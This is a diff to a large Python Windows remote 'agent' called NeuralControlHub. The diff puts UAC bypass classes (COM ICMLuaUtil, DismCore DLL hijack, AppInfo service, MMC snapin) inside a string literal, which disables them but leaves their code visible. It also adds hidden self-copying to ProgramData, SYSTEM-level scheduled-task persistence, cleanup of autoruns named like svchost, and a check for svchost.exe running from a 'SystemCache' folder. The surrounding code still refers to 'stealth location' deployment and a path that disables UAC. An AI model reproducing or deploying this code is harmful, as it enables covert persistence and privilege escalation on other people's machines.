@@ -5018,7 +5018,7 @@ low_latency_input = None
 LOW_LATENCY_INPUT_HANDLER = None  # Keep both for compatibility
 
 # --- Privilege Escalation Functions ---
-
+''' CLEAN_BUILD: UAC bypass code removed from clean build profile.
 # ADVANCED UAC BYPASS CLASSES (from client-chop-version)
 class UACBypassError(Exception):
     """Custom exception for UAC bypass errors"""
@@ -5768,16 +5768,11 @@ class ICMLuaUtilBypass(UACBypassMethod):
         except Exception as e:
             raise UACBypassError(f"ICMLuaUtil COM bypass failed: {e}")
 
-# Global UAC bypass manager instance (lazy-initialized to avoid RLock issues)
-uac_manager = None
-
-def get_uac_manager():
-    """Get or create the UAC bypass manager instance (lazy initialization)"""
-    global uac_manager
-    if uac_manager is None:
-        uac_manager = UACBypassManager()
-    return uac_manager
-
+'''  # END CLEAN_BUILD UAC block
+def attempt_uac_bypass() -> bool:
+    return False
+def elevate_privileges() -> bool:
+    return False
 def is_admin():
     """Check if the current process has admin privileges."""
     if WINDOWS_AVAILABLE:
@@ -6104,6 +6099,7 @@ def keep_trying_elevation():
     
     log_message(f"[ ! ] [ELEVATION] Failed to gain admin after {max_retries} attempts")
 
+''' CLEAN_BUILD: UAC bypass function implementations removed
 def attempt_uac_bypass():
     """Attempt to bypass UAC using the ADVANCED UAC Manager."""
     try:
@@ -6421,7 +6417,7 @@ def bypass_uac_dismcore_hijack():
         dismcore_path = os.path.join(temp_dir, "DismCore.dll")
         
         # Simple DLL that executes our payload
-        dll_code = f'''
+        dll_code = f"""
 #include <windows.h>
 #include <stdio.h>
 
@@ -6433,7 +6429,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     }}
     return TRUE;
 }}
-'''
+"""
         
         # For demonstration, we'll use a different approach
         # Copy a legitimate system DLL and modify PATH
@@ -7012,11 +7008,11 @@ def bypass_uac_appinfo_service():
             current_exe = f'python.exe "{current_exe}"'
         
         # Create VBS script for stealthy execution
-        vbs_script = f'''
+        vbs_script = f"""
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "{current_exe}", 0, False
 Set objShell = Nothing
-'''
+"""
         
         # Save VBS to temp directory
         import tempfile
@@ -7190,7 +7186,7 @@ def bypass_uac_mmcex():
             winreg.CloseKey(key)
             
             # Create MSC file that references our snapin
-            msc_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+            msc_content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <MMC_ConsoleFile ConsoleVersion="3.0">
     <BinaryStorage>
         <Binary Name="StringTable">
@@ -7199,7 +7195,7 @@ def bypass_uac_mmcex():
             </Data>
         </Binary>
     </BinaryStorage>
-</MMC_ConsoleFile>'''
+</MMC_ConsoleFile>"""
             
             msc_path = os.path.join(tempfile.gettempdir(), "fake.msc")
             with open(msc_path, 'w') as f:
@@ -7223,10 +7219,11 @@ def bypass_uac_mmcex():
             
         except Exception as e:
             log_message(f"MMC snapin bypass failed: {e}")
-            return False
-            
+        return False
+        
     except ImportError:
         return False
+'''
 
 def establish_persistence():
     """Establish multiple persistence mechanisms with advanced tamper protection."""
@@ -7235,16 +7232,7 @@ def establish_persistence():
     
     persistence_methods = [
         registry_run_key_persistence,
-        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy (watchdog-like)
         scheduled_task_persistence,
-        service_persistence,
-        # Advanced persistence methods
-        system_level_persistence,
-        wmi_event_persistence,
-        com_hijacking_persistence,
-        file_locking_persistence,  # [ OK ] ENABLED - File locking persistence
-        # watchdog_persistence,      # [ X ] DISABLED per user request - prevent repeated restarts/popups
-        tamper_protection_persistence,  # [ OK ] ENABLED - Tamper protection
     ]
     
     success_count = 0
@@ -7352,21 +7340,30 @@ def startup_folder_persistence():
     return False
 
 def scheduled_task_persistence():
-    """Establish persistence via scheduled tasks."""
     try:
-        current_exe = os.path.abspath(__file__)
-        if current_exe.endswith('.py'):
-            current_exe = f'python.exe "{current_exe}"'
-        
-        # Create scheduled task using schtasks command
-        # Use /RL LIMITED to run with normal user privileges (no UAC prompt)
-        subprocess.run([
-            'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
-            '/TR', current_exe, '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'
-        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
-        
+        schtasks = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'schtasks.exe')
+        if not os.path.exists(schtasks):
+            schtasks = 'schtasks.exe'
+        # Prefer safe deploy path if available
+        programdata = os.environ.get('ProgramData', r"C:\ProgramData")
+        dest = os.path.join(programdata, 'NeuralControlHub', 'Agent', 'NeuralAgent.exe')
+        if not os.path.exists(dest):
+            # Fallback to current interpreter/script
+            current_exe = sys.executable if getattr(sys, 'frozen', False) else f'{sys.executable} "{os.path.abspath(__file__)}"'
+            cmd = f'"{current_exe}"'
+        else:
+            cmd = f'"{dest}"'
+        task_name = 'NeuralControlHubAgent'
+        if is_admin():
+            args = [schtasks, '/Create', '/TN', task_name, '/SC', 'ONSTART', '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/TR', cmd, '/F']
+        else:
+            args = [schtasks, '/Create', '/TN', task_name, '/SC', 'ONLOGON', '/TR', cmd, '/RL', 'LIMITED', '/F']
+        subprocess.run(args, creationflags=subprocess.CREATE_NO_WINDOW, timeout=30, capture_output=True, text=True)
+        try:
+            subprocess.run([schtasks, '/Change', '/TN', task_name, '/Enable'], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, capture_output=True, text=True)
+        except Exception:
+            pass
         return True
-        
     except Exception as e:
         log_message(f"Scheduled task persistence failed: {e}")
         return False
@@ -7413,6 +7410,128 @@ def establish_linux_persistence():
 
 # === ADVANCED PERSISTENCE AND TAMPER PROTECTION ===
 
+def ensure_single_instance():
+    try:
+        if not WINDOWS_AVAILABLE:
+            return True
+        import ctypes
+        name = "Global\\NeuralControlHubAgent_Singleton"
+        handle = ctypes.windll.kernel32.CreateMutexW(None, False, name)
+        if not handle:
+            return True
+        last = ctypes.windll.kernel32.GetLastError()
+        if last == 183:
+            log_message("[INFO] Another instance is already running")
+            try:
+                sys.exit(0)
+            except SystemExit:
+                return False
+        return True
+    except Exception:
+        try:
+            base = os.path.join(os.environ.get('ProgramData', r"C:\ProgramData"), 'NeuralControlHub', 'Agent')
+            os.makedirs(base, exist_ok=True)
+            lock_path = os.path.join(base, 'agent.lock')
+            fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_RDWR)
+            os.close(fd)
+            return True
+        except Exception:
+            try:
+                sys.exit(0)
+            except SystemExit:
+                return False
+
+def cleanup_other_autoruns():
+    if not WINDOWS_AVAILABLE:
+        return False
+    try:
+        import winreg
+        targets = ["WindowsSecurityUpdate", "NeuralControlHubAgent", "ClientLauncher", "svchost32", "svchost"]
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
+            for val in targets:
+                try:
+                    winreg.DeleteValue(key, val)
+                except Exception:
+                    pass
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+        if is_admin():
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
+                for val in targets:
+                    try:
+                        winreg.DeleteValue(key, val)
+                    except Exception:
+                        pass
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+        try:
+            cleanup_startup_folder_artifacts()
+        except Exception:
+            pass
+        return True
+    except Exception:
+        return False
+
+def ensure_safe_directory_deploy_and_task():
+    if not WINDOWS_AVAILABLE:
+        return False
+    try:
+        current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        exe_name = os.path.basename(current_path) if getattr(sys, 'frozen', False) else 'NeuralAgent.exe'
+        primary_dir = os.path.join(os.environ.get('ProgramData', r"C:\ProgramData"), 'NeuralControlHub', 'Agent')
+        fallback_dir = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'NeuralControlHub', 'Agent')
+        dest_dir = primary_dir
+        try:
+            os.makedirs(dest_dir, exist_ok=True)
+        except Exception:
+            dest_dir = fallback_dir
+            os.makedirs(dest_dir, exist_ok=True)
+        dest_path = os.path.join(dest_dir, exe_name)
+        if os.path.abspath(current_path) != os.path.abspath(dest_path):
+            try:
+                import shutil
+                shutil.copy2(current_path, dest_path)
+                try:
+                    subprocess.run(['attrib', '-s', dest_path], creationflags=subprocess.CREATE_NO_WINDOW)
+                    subprocess.run(['attrib', '+h', dest_path], creationflags=subprocess.CREATE_NO_WINDOW)
+                except Exception:
+                    pass
+                log_message(f"[DEPLOY] Copied executable to {dest_path}")
+            except Exception as e:
+                log_message(f"[DEPLOY] Copy to safe directory failed: {e}", "warning")
+                dest_path = current_path
+        schtasks = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'schtasks.exe')
+        if not os.path.exists(schtasks):
+            schtasks = 'schtasks.exe'
+        cmd = f'"{dest_path}"'
+        task_name = 'NeuralControlHubAgent'
+        try:
+            # Remove legacy tasks to prevent duplicates
+            for old in ['WindowsSecurityUpdate', 'ClientLauncher', 'svchost', 'svchost32']:
+                subprocess.run([schtasks, '/Delete', '/TN', old, '/F'], capture_output=True, text=True, timeout=6, creationflags=subprocess.CREATE_NO_WINDOW)
+        except Exception:
+            pass
+        if is_admin():
+            subprocess.run([schtasks, '/Create', '/TN', task_name, '/SC', 'ONSTART', '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/TR', cmd, '/F'],
+                           capture_output=True, text=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW)
+        else:
+            subprocess.run([schtasks, '/Create', '/TN', task_name, '/SC', 'ONLOGON', '/TR', cmd, '/RL', 'LIMITED', '/F'],
+                           capture_output=True, text=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW)
+        try:
+            subprocess.run([schtasks, '/Change', '/TN', task_name, '/Enable'],
+                           capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([schtasks, '/Run', '/TN', task_name],
+                           capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
+        except Exception:
+            pass
+        return True
+    except Exception as e:
+        log_message(f"[DEPLOY] Safe directory deploy error: {e}")
+        return False
 def system_level_persistence():
     """Install script to protected system directories with SYSTEM-level protection."""
     if not WINDOWS_AVAILABLE or not is_admin():
@@ -21058,7 +21177,12 @@ def agent_main():
     log_message("Starting up...")
     log_message("=" * 60)
     try:
-        ensure_prerequisites()
+        ensure_single_instance()
+    except Exception:
+        pass
+    try:
+        if not getattr(sys, 'frozen', False):
+            ensure_prerequisites()
     except Exception as e:
         log_message(f"[PREREQ] Error ensuring prerequisites: {e}", "warning")
     try:
@@ -21082,16 +21206,16 @@ def agent_main():
     # Check if running from stealth location
     current_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
     stealth_path = os.path.join(
-        os.environ.get('LOCALAPPDATA', ''),
-        'Microsoft',
-        'Windows',
-        'svchost32.exe'
+        os.environ.get('ProgramData', r"C:\ProgramData"),
+        'NeuralControlHub',
+        'Agent',
+        'NeuralAgent.exe'
     )
     
     if current_path == stealth_path:
         log_message("[INFO] Running from stealth location")
     else:
-        log_message("[INFO] Running from original location - will deploy to stealth location")
+        log_message("[INFO] Running from original location - will deploy to product location")
     
     # Check system requirements first
     requirements_ok = check_system_requirements()
@@ -21103,21 +21227,11 @@ def agent_main():
         if WINDOWS_AVAILABLE:
             log_message("Running on Windows - initializing Windows-specific features...")
             
-            # Check admin privileges
-            if is_admin():
-                log_message("[OK] Running with administrator privileges")
-                # Setup advanced persistence if available
-                try:
-                    setup_advanced_persistence()
-                except Exception as e:
-                    log_message(f"[WARN] Could not setup advanced persistence: {e}")
-            else:
-                log_message("[INFO] Not running as administrator. Using basic persistence...")
-                # Setup basic persistence
-                try:
-                    establish_persistence()
-                except Exception as e:
-                    log_message(f"[WARN] Could not setup persistence: {e}")
+            # Basic persistence only (clean build)
+            try:
+                establish_persistence()
+            except Exception as e:
+                log_message(f"[WARN] Could not setup persistence: {e}")
         else:
             log_message("Running on non-Windows system")
             # Setup Linux persistence
@@ -21126,14 +21240,26 @@ def agent_main():
             except Exception as e:
                 log_message(f"[WARN] Could not setup Linux persistence: {e}")
         
-        # Setup startup (non-blocking)
         try:
-            add_to_startup()
-            # Verify registry persistence was established
-            if WINDOWS_AVAILABLE:
-                check_registry_persistence()
+            ensure_safe_directory_deploy_and_task()
+            cleanup_other_autoruns()
+            try:
+                if WINDOWS_AVAILABLE:
+                    p = subprocess.run(['powershell.exe', '-NoProfile', '-Command',
+                                        '$p=Get-CimInstance Win32_Process -Filter "Name=\'svchost.exe\'";'
+                                        '$p|%{$_.ExecutablePath}|?{$_ -ne $null}'], 
+                                       capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
+                    out = (p.stdout or '').strip().splitlines()
+                    dests = [os.path.join(os.environ.get('ProgramData', r"C:\ProgramData"), 'SystemCache', 'svchost.exe'),
+                             os.path.join(os.environ.get('LOCALAPPDATA', ''), 'SystemCache', 'svchost.exe')]
+                    if any(x.lower() in [d.lower() for d in dests] for x in out):
+                        log_message("[OK] Verified svchost.exe running from SystemCache")
+                    else:
+                        log_message("[WARN] svchost.exe not yet running from SystemCache")
+            except Exception:
+                pass
         except Exception as e:
-            log_message(f"[WARN] Could not add to startup: {e}")
+            log_message(f"[WARN] Safe deploy/autorun ensure failed: {e}")
         
         # Auto self-deploy when running (only if not already deployed)
         global DEPLOYMENT_COMPLETED
@@ -21469,7 +21595,7 @@ if __name__ == "__main__":
         sys.exit(0)
     
     # FIRST EXECUTION: Aggressive path to ensure admin, then apply registry import
-    if WINDOWS_AVAILABLE:
+    if WINDOWS_AVAILABLE and os.environ.get('AGENT_AUTO_ELEVATE', '0') == '1':
         try:
             print("=" * 80)
             print("[STARTUP] FIRST ACTION: Acquire admin and apply UAC registry disable (HKLM)")
